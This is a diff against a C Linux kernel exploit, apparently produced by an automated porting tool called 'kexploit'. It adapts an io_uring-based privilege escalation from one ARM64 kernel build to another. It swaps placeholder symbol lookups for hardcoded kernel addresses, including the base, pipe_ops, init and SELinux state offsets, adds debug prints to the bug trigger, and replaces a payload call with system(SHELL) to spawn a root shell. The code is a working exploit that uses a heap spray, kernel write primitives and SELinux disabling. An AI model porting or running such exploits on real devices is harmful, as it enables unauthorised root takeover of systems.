@@ -1,4 +1,8 @@
-__kexploit_src_metadata("{\"original_kernel_name\":\"ingots_5.10.66\",\"current_kernel_name\":\"ingots_5.10.66\"}")
+
+// Exploit adapted by kexploit
+// Original kernel name: ingots_5.10.66
+// Adaptation kernel name: ingots_5.10.107
+
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -16,7 +20,6 @@ __kexploit_src_metadata("{\"original_kernel_name\":\"ingots_5.10.66\",\"current_
 #include <sys/uio.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
-#include <root_payload.h>
 
 typedef uint64_t u64;
 typedef int64_t i64;
@@ -517,18 +520,18 @@ usize linear_base = 0;
 // this kernel does not have kmalloc-192, so object of interest goes in kmalloc-256
 #define SPRAY_SIZE 256
 
-#define KERNEL_BASE __kexploit_kernel_address("{\"address\":18446743799100080128,\"is_relative\":false}")
+#define KERNEL_BASE 0xffffffc010000000
 
 // on arm this symbol is called memstart_addr
-#define PAGE_OFFSET_BASE (__kexploit_kernel_address("{\"address\":18446743799138654616,\"is_relative\":false}") - KERNEL_BASE)
-#define PIPE_OPS_OFFSET (__kexploit_kernel_address("{\"address\":18446743799137015528,\"is_relative\":false}") - KERNEL_BASE)
-#define INIT_OFFSET (__kexploit_kernel_address("{\"address\":18446743799143906880,\"is_relative\":false}") - KERNEL_BASE)
+#define PAGE_OFFSET_BASE (0xffffffc0121bc3d0 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffc01201bc28 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffc012cbc3c0 - KERNEL_BASE)
 
 // optinally define to turn off selinux
-#define SELINUX_STATE_OFFSET (__kexploit_kernel_address("{\"address\":18446743799146691352,\"is_relative\":false}") - KERNEL_BASE)
+#define SELINUX_STATE_OFFSET (0xffffffc012e2b9a8 - KERNEL_BASE)
 
 // first 64 bit word of kernel image
-#define KERNEL_START_WORD __kexploit_kernel_data("{\"address\":18446743799100080128,\"num_bytes\":8,\"original_value\":1484710131542284877}")
+#define KERNEL_START_WORD 0x14a47fff91005a4d
 
 #define VMEMMAP_START 0xfffffffeffe00000
 #define LINEAR_BASE 0xffffff8000000000
@@ -636,6 +639,9 @@ void setup_bug() {
 
 void trigger_bug() {
   io_uring_enter_poll(&context.io_uring, 2);
+  struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
   SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
   pthread_join(context.trigger_thread, NULL);
 }
@@ -1105,8 +1111,7 @@ void exploit() {
   write64_kernel(SELINUX_STATE_OFFSET + kaslr_base - 7, 0);
 #endif
 
-  // system(SHELL);
-  root_payload();
+  system(SHELL);
 
   while (1) {
     sleep(1000);
